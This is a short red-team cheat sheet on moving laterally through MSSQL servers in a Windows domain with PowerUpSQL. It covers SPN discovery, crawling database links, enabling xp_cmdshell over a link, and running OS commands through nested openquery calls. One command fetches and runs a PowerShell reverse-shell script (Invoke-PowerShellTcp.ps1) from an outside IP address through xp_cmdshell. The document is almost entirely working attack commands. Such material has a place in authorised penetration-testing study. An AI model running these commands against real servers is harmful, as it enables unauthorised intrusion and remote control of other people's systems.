MSSQL servers are generally deployed in a Windows Domain. SQL servers can be very good options for lateral movement as domain users can be mapped to database roles. For MSSQL and PowerShell magic we will use PowerUpSQL. https://github.com/NetSPI/PowerUpSQL

Enumeration 

```powershell
#Discovery (SPN Scanning)
Get-SQLInstanceDomain


#Check Accessibility
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose 


#Gather Information
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

Database Links: A database link allows a SQL server to access external data sources like other SQL servers and OLE DB data sources. In case of database links between SQL servers it is possible to execute stored procedures. Database links work even across forest trusts.


Search for database links.

```powershell
#Look for links to remote servers
Get-SQLServerLink -Instance mssql -Verbose

Or

select * from master..sysservers


#Openquery() function can be used to run queries on a linked database
select * from openquery("sql1",'select * from master..sysservers')


#Enumerating Database Links
Get-SQLServerLinkCrawl -Instance mssql -Verbose

or

#Openquery queries can be chained to access links within links (nested  links)
select * from openquery("sql1",'select * from openquery("mgmt",''select * from master..sysservers'')')
```


Executing Commands.

```powershell
#On the target server either xp_cmdshell should already be enabled
#Or if rpcout is enabled (disabled by default) xp_cmdshell can be enabled using:
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "external-sql"


#Executing Commands
Get-SQLServerLinkCrawl -Instance mssql -Query "exec master..xp_cmdshell 'whoami'" 

Get-SQLServerLinkCrawl -Instance mssql.abc.example.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http:// 172.1.1.30/Invoke-PowerShellTcp.ps1'')"'

or

#From the initial SQL server, OS commands can be executed using nested link queries:
select * from openquery("sql1",'select * from openquery("mgmt",''select * from openquery("external-sql.eu.external.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')


```